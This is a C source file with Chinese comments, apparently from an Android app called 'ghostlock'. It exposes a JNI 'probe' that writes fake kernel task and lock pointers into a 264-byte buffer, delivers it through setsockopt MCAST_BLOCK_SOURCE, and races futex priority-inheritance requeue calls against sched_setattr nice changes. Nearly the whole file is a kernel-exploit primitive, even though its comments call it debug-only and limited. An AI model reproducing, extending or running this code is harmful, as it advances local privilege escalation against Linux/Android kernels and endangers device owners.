/**
 * @file mcast510_probe.c
 * @brief A1 single-shot multicast probe（debug-only；legacy1 consumer 语义）。
 *
 * 依据（逐行）：
 * - `very_legacy/temp_mcast_510.c:105-130`（one-shot do_kernel5_fake_lock_route）；
 * - `very_legacy/fops.c:136-150` k5_build_mcast_stamp（waiter 96/task48/lock56/
 *   family@8 AF_UNSPEC/buffer 264）；
 * - `very_legacy/fops.c:26-39` mr_stamp（同字段顺序）；
 * - `very_legacy/main.c:387-442` consumer_apply_nice/consumer_thread（go/inflight/
 *   calls/success；sched_setattr SCHED_BATCH；futex PI fallback）；
 * - `very_legacy/util.c:101-123` disable_rseq no-op/sched_setattr_tid（syscall 274）。
 *
 * 安全边界：debug-only 源，只在 Debug 编入 libghostlock43499；不进入生产路径。
 * 只发 1 条 MCAST_BLOCK_SOURCE stamp；不 spawn victim、不写内核 flags/mode、不改 selinux。
 * PI/consumer 内不做 JNI/IO/日志；结果在返回后由 Kotlin 写盘/logcat。
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <jni.h>

#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif
#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI 6
#endif
#ifndef FUTEX_UNLOCK_PI
#define FUTEX_UNLOCK_PI 7
#endif
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

#define MCAST510_JNI_EXPORT JNIEXPORT

typedef struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
} glk_mcast510_sched_attr;

static atomic_int g_go;
static atomic_int g_stop;
static atomic_int g_calls;
static atomic_int g_success;
static atomic_int g_inflight;
static atomic_int g_waiter_tid;
static atomic_int g_delay_us;
static atomic_int g_pi_target;
static int g_consumer_cpu;
static uint32_t g_chain_word;
static uint32_t g_wait_word;
static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_waiter_wait_ret;
static atomic_int g_waiter_wait_errno;
static atomic_int g_waiter_stop;
static int g_waiter_cpu;
static atomic_int g_owner_started;
static atomic_int g_owner_stop;
static atomic_int g_owner_lock_ret;
static atomic_int g_owner_lock_errno;
static atomic_int g_owner_chain_ret;
static atomic_int g_owner_chain_errno;
static atomic_int g_owner_ready;
static atomic_int g_requeue_ret;
static atomic_int g_requeue_errno;
static atomic_int g_owner_enabled;
static atomic_int g_requeue_enabled;
static int g_settle_usec;

static long mcast510_futex(uint32_t *uaddr, int op, uint32_t val,
                           const struct timespec *timeout, uint32_t *uaddr2,
                           uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/** @brief legacy consumer_apply_nice（main.c:387-404）逐行同形。 */
static long mcast510_apply_nice(int tid, int calls_this_seq) {
    glk_mcast510_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size = (uint32_t) sizeof(attr);
    attr.sched_policy = 3; /* SCHED_BATCH：nice 变化触发 PI walk */
    attr.sched_nice = (calls_this_seq % 19) + 1; /* compact_waiter=1 */
    errno = 0;
    long ret = syscall(SYS_sched_setattr, tid, &attr, 0);
    if (ret != 0) {
        struct timespec ft = {.tv_sec = 0, .tv_nsec = 50 * 1000 * 1000L};
        long fret = mcast510_futex(
            (uint32_t *) &g_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
        if (fret == 0) {
            (void) mcast510_futex(
                (uint32_t *) &g_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            ret = 0;
        }
    }
    return ret;
}

/** @brief legacy2 race.cpp:206-230 owner_thread 同形（LOCK_PI(target) → waiter_ready → LOCK_PI(chain)）。 */
static void *mcast510_owner(void *arg) {
    (void) arg;
    errno = 0;
    long lock_target = mcast510_futex(
        (uint32_t *) &g_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&g_owner_lock_ret, (int) lock_target);
    atomic_store(&g_owner_lock_errno, errno);
    while (!atomic_load(&g_waiter_ready) && !atomic_load(&g_owner_stop)) {
        sched_yield();
    }
    if (atomic_load(&g_owner_stop)) {
        if (lock_target == 0) {
            (void) mcast510_futex(
                (uint32_t *) &g_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        }
        return NULL;
    }
    atomic_store(&g_owner_started, 1);
    errno = 0;
    long lock_chain = mcast510_futex(
        &g_chain_word, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&g_owner_chain_ret, (int) lock_chain);
    atomic_store(&g_owner_chain_errno, errno);
    atomic_store(&g_owner_ready, 1);
    while (!atomic_load(&g_owner_stop)) sleep(1);
    if (lock_target == 0) {
        (void) mcast510_futex(
            (uint32_t *) &g_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    return NULL;
}

/** @brief legacy waiter_enter_chain/waiter_wait_chain（main.c:280-308）最小同形。 */
static void *mcast510_waiter(void *arg) {
    (void) arg;
    if (g_waiter_cpu >= 0) {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(g_waiter_cpu, &set);
        (void) sched_setaffinity(0, sizeof(set), &set);
    }
    atomic_store(&g_waiter_tid, (int) syscall(SYS_gettid));
    /* 1) 模拟 actor 持 chain：FUTEX_LOCK_PI(chain)。 */
    errno = 0;
    long chain_ret = mcast510_futex(&g_chain_word, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&g_waiter_ready, 1);
    if (chain_ret != 0) {
        atomic_store(&g_waiter_wait_errno, errno);
        atomic_store(&g_waiter_wait_ret, -1);
        return NULL;
    }
    if (atomic_load(&g_owner_enabled)) {
        /* race.cpp:164-166 同形：等 owner 持 target 并设置 owner_started。 */
        for (long spin = 0; spin < 100000000L && !atomic_load(&g_owner_started); spin++) {
            sched_yield();
        }
    }
    /* 2) FUTEX_WAIT_REQUEUE_PI(shared word, absolute deadline 1s)。 */
    struct timespec deadline;
    clock_gettime(CLOCK_MONOTONIC, &deadline);
    deadline.tv_sec += 1;
    atomic_store(&g_waiter_waiting, 1);
    errno = 0;
    long wait_ret = mcast510_futex(
        &g_wait_word, FUTEX_WAIT_REQUEUE_PI, 0, &deadline,
        (uint32_t *) &g_pi_target, 0);
    atomic_store(&g_waiter_wait_ret, (int) wait_ret);
    atomic_store(&g_waiter_wait_errno, errno);
    /* 等 main 收尾后释放 chain（不把 chain 留给后续 run）。 */
    while (!atomic_load(&g_waiter_stop)) sched_yield();
    (void) mcast510_futex(&g_chain_word, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

/** @brief legacy consumer_thread（main.c:406-442）最小同形。 */
static void *mcast510_consumer(void *arg) {
    (void) arg;
    /* legacy consumer 只在执行体内 pin；CPU<0 表示不 pin。 */
    if (g_consumer_cpu >= 0) {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(g_consumer_cpu, &set);
        (void) sched_setaffinity(0, sizeof(set), &set);
    }
    int seen = 0;
    while (!atomic_load(&g_stop)) {
        int seq = atomic_load(&g_go);
        if (seq == 0 || seq == seen) {
            sched_yield();
            continue;
        }
        seen = seq;
        int tid = atomic_load(&g_waiter_tid);
        int calls_this_seq = 0;
        while (!atomic_load(&g_stop) && atomic_load(&g_go) == seq) {
            int delay_usec = atomic_load(&g_delay_us);
            if (delay_usec > 0) usleep((useconds_t) delay_usec);
            atomic_fetch_add(&g_calls, 1);
            atomic_store(&g_inflight, 1);
            long sched_ret = mcast510_apply_nice(tid, calls_this_seq);
            if (sched_ret == 0) atomic_fetch_add(&g_success, 1);
            atomic_store(&g_inflight, 0);
            calls_this_seq++;
            atomic_store(&g_go, 0);
            break; /* legacy probe：consumer_max_calls=1 */
        }
    }
    return NULL;
}

/** @brief A1 probe：单发 264B stamp + consumer（bounded），返回 12 个 long 字段。 */
MCAST510_JNI_EXPORT jlongArray JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_mcast510Probe(
    JNIEnv *env, jclass clazz, jlong fake_lock, jlong fake_task, jlong fake_w0,
    jlong page_base, jlong target, jlong timeout_ms, jint consumer_cpu,
    jboolean pi_waiter, jint waiter_cpu,
    jboolean owner, jboolean requeue, jint settle_ms) {
    (void) clazz;
    (void) fake_w0; /* waiter 未单独写；保留字段供结果/对照 */
    (void) timeout_ms;
    enum { kFieldCount = 24 };
    jlong out[kFieldCount];
    memset(out, 0, sizeof(out));
    out[5] = target;
    out[6] = fake_lock;
    out[7] = fake_task;
    out[8] = fake_w0;
    out[9] = page_base;

    unsigned char stamp[264];
    memset(stamp, 0, sizeof(stamp));
    const uint64_t task_value = (uint64_t) fake_task;
    const uint64_t lock_value = (uint64_t) fake_lock;
    memcpy(stamp + 96 + 48, &task_value, sizeof(task_value));
    memcpy(stamp + 96 + 56, &lock_value, sizeof(lock_value));
    const uint16_t family = 0; /* AF_UNSPEC */
    memcpy(stamp + 8, &family, sizeof(family));

    const int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0) {
        out[0] = -1;
        out[1] = errno;
        out[11] = 61;
        jlongArray array = (*env)->NewLongArray(env, kFieldCount);
        if (array != NULL) {
            (*env)->SetLongArrayRegion(env, array, 0, kFieldCount, out);
        }
        return array;
    }

    atomic_store(&g_go, 0);
    atomic_store(&g_stop, 0);
    atomic_store(&g_calls, 0);
    atomic_store(&g_success, 0);
    atomic_store(&g_inflight, 0);
    atomic_store(&g_waiter_tid, 0); /* legacy probe 无 waiter 线程 */
    atomic_store(&g_delay_us, 0);
    atomic_store(&g_pi_target, (int) (0x80000000U | (uint32_t) getpid()));
    g_consumer_cpu = (int) consumer_cpu;
    g_waiter_cpu = (int) waiter_cpu;
    atomic_store(&g_waiter_ready, 0);
    atomic_store(&g_waiter_waiting, 0);
    atomic_store(&g_waiter_wait_ret, 0);
    atomic_store(&g_waiter_wait_errno, 0);
    atomic_store(&g_waiter_stop, 0);
    g_chain_word = 0;
    g_wait_word = 0;
    atomic_store(&g_owner_started, 0);
    atomic_store(&g_owner_stop, 0);
    atomic_store(&g_owner_lock_ret, 0);
    atomic_store(&g_owner_lock_errno, 0);
    atomic_store(&g_owner_chain_ret, 0);
    atomic_store(&g_owner_chain_errno, 0);
    atomic_store(&g_owner_ready, 0);
    atomic_store(&g_requeue_ret, 0);
    atomic_store(&g_requeue_errno, 0);
    atomic_store(&g_owner_enabled, owner != JNI_FALSE ? 1 : 0);
    atomic_store(&g_requeue_enabled, requeue != JNI_FALSE ? 1 : 0);
    g_settle_usec = (int) settle_ms * 1000;

    pthread_t waiter;
    const int waiter_created = pi_waiter != JNI_FALSE
        ? pthread_create(&waiter, NULL, mcast510_waiter, NULL)
        : 0;
    pthread_t owner_thread;
    const int owner_created = (owner != JNI_FALSE && pi_waiter != JNI_FALSE)
        ? pthread_create(&owner_thread, NULL, mcast510_owner, NULL)
        : 0;
    if (pi_waiter != JNI_FALSE) {
        for (long spin = 0; spin < 100000000L && atomic_load(&g_waiter_waiting) == 0; spin++) {
            __asm__ volatile("yield" ::: "memory");
        }
    }

    pthread_t consumer;
    const int created = pthread_create(&consumer, NULL, mcast510_consumer, NULL);
    if (created != 0) {
        close(fd);
        out[0] = -2;
        out[1] = created;
        out[11] = 61;
        jlongArray array = (*env)->NewLongArray(env, kFieldCount);
        if (array != NULL) {
            (*env)->SetLongArrayRegion(env, array, 0, kFieldCount, out);
        }
        return array;
    }

    struct timespec start;
    clock_gettime(CLOCK_MONOTONIC, &start);
    if (atomic_load(&g_requeue_enabled)) {
        if (pi_waiter != JNI_FALSE) {
            for (long spin = 0; spin < 100000000L &&
                 (!atomic_load(&g_waiter_waiting) ||
                  (atomic_load(&g_owner_enabled) && !atomic_load(&g_owner_started)));
                 spin++) {
                __asm__ volatile("yield" ::: "memory");
            }
        }
        if (g_settle_usec > 0) usleep((useconds_t) g_settle_usec);
        errno = 0;
        long rq = mcast510_futex(
            &g_wait_word, FUTEX_CMP_REQUEUE_PI, 1, (void *) 1,
            (uint32_t *) &g_pi_target, 0);
        atomic_store(&g_requeue_ret, (int) rq);
        atomic_store(&g_requeue_errno, errno);
    }
    /* legacy fops.c k5_send_mcast_stamp 同形：先 setsockopt，再 go=1；
     * consumer 必须在 stamp 之后才开始 PI walk（不是之前）。 */
    atomic_store(&g_calls, 0);
    atomic_store(&g_success, 0);
    atomic_store(&g_inflight, 0);
    atomic_store(&g_stop, 0);
    atomic_store(&g_delay_us, 0);
    atomic_store(&g_go, 0);
    errno = 0;
    const int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp,
                               (socklen_t) sizeof(stamp));
    const int apply_errno = errno;
    atomic_store(&g_go, 1);
    /* legacy k5_send_mcast_stamp：等 consumer_calls>0（有界），再清 go/等 inflight。 */
    for (long spin = 0; spin < 100000000L && atomic_load(&g_calls) == 0; spin++) {
        __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&g_go, 0);
    for (long spin = 0; spin < 100000000L && atomic_load(&g_inflight) != 0; spin++) {
        __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&g_stop, 1);
    pthread_join(consumer, NULL);
    if (pi_waiter != JNI_FALSE) {
        atomic_store(&g_waiter_stop, 1);
        pthread_join(waiter, NULL);
    } else if (waiter_created != 0) {
        atomic_store(&g_waiter_stop, 1);
    }
    if (owner_created != 0) {
        atomic_store(&g_owner_stop, 1);
        pthread_join(owner_thread, NULL);
    }
    struct timespec end;
    clock_gettime(CLOCK_MONOTONIC, &end);
    close(fd);

    const long elapsed_ns =
        (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
    const jlong calls = atomic_load(&g_calls);
    const jlong success = atomic_load(&g_success);
    out[0] = ret;
    out[1] = apply_errno;
    out[2] = calls;
    out[3] = success;
    out[4] = elapsed_ns;
    out[10] = (jlong) consumer_cpu;
    /* legacy do_kernel5_fake_lock_route：PASS 时 route_last_step=0，否则 61。 */
    out[11] = (ret == 0 || success > 0) ? 0 : 61;
    out[12] = atomic_load(&g_waiter_wait_ret);
    out[13] = atomic_load(&g_waiter_wait_errno);
    out[14] = atomic_load(&g_waiter_tid);
    out[15] = (jlong) waiter_cpu;
    out[16] = atomic_load(&g_owner_lock_ret);
    out[17] = atomic_load(&g_owner_lock_errno);
    out[18] = atomic_load(&g_owner_chain_ret);
    out[19] = atomic_load(&g_owner_chain_errno);
    out[20] = atomic_load(&g_requeue_ret);
    out[21] = atomic_load(&g_requeue_errno);
    out[22] = atomic_load(&g_owner_started);
    out[23] = (jlong) settle_ms;
    jlongArray array = (*env)->NewLongArray(env, kFieldCount);
    if (array != NULL) {
        (*env)->SetLongArrayRegion(env, array, 0, kFieldCount, out);
    }
    return array;
}
